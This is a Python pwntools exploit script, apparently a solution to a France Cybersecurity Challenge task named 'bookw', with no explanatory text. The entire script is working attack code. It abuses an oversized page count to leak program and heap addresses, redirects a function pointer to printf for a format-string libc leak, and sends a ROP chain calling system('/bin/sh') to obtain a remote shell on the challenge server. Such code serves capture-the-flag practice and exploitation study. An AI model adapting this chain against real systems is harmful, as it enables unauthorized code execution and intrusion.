from pwn import *

elf = ELF("./bookw", checksec=False)
libc = elf.libc
global p

def create(name, pages):
    p.sendlineafter(b"Quitter\n", b"1")
    p.sendlineafter(b"?\n", name)
    p.sendlineafter(b"?\n", pages)
    p.recvuntil(b"\"")
    name  = p.recvuntil(b"\"", drop= True)
    p.recvuntil(b"page ")
    pages = p.recvline().strip()
    return [name, pages]

def open(idx):
    p.sendlineafter(b"Quitter\n", b"2")
    p.clean()
    p.sendline(idx)

def write(content):
    p.sendlineafter(b"Quitter\n", b"3")
    p.sendlineafter(b"?", content)

def read():
    p.sendlineafter(b"Quitter\n", b"4")
    p.recvuntil(b"\"")
    return p.recvuntil(b"\"", drop=True)

def inc():
    p.sendlineafter(b"Quitter\n", b"5")



#p = process(elf.path)
p = remote('challenges.france-cybersecurity-challenge.fr', 2112)

create(b"salutatous ", str(1152921504606846977).encode())

create(b"B"*63, str(1).encode())





open(b"0")

inc()

leak = read()
elf_leak = leak[16:][:8]
elf.address = u64(elf_leak) - elf.sym['read_page']
heap = u64(leak[96:][:8].ljust(8, b"\0"))

info("pie @0x%hx" % elf.address)
info("heap @0x%hx" % heap)




open(b"0")
inc()

write(b"A"*16+b"AAA%41$p"+p64(elf.plt.printf)) 


open(b"1")

write(p64(0xdeadbeefdeadbeef)*8)


p.recvuntil(b"AAA")
libc.address = int(p.recvuntil(b"\x80", drop=True),0) - 160517
info("libc @0x%hx" % libc.address)


# verify libc

open(b"0")
inc()
write(b"A"*16+p64(0xdeadbeefdeadbeef)+p64(libc.address +0x000000000003f1e9 )) #0x000000000003f1e9 : add rsp, 0x28 ; ret
open(b"1")


ret     = 0x0000000000027182+libc.address
pop_rdi = 0x00000000000277e5 + libc.address

payload = b""
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\0")))
payload += p64(libc.sym.system)
write(payload)




p.interactive()
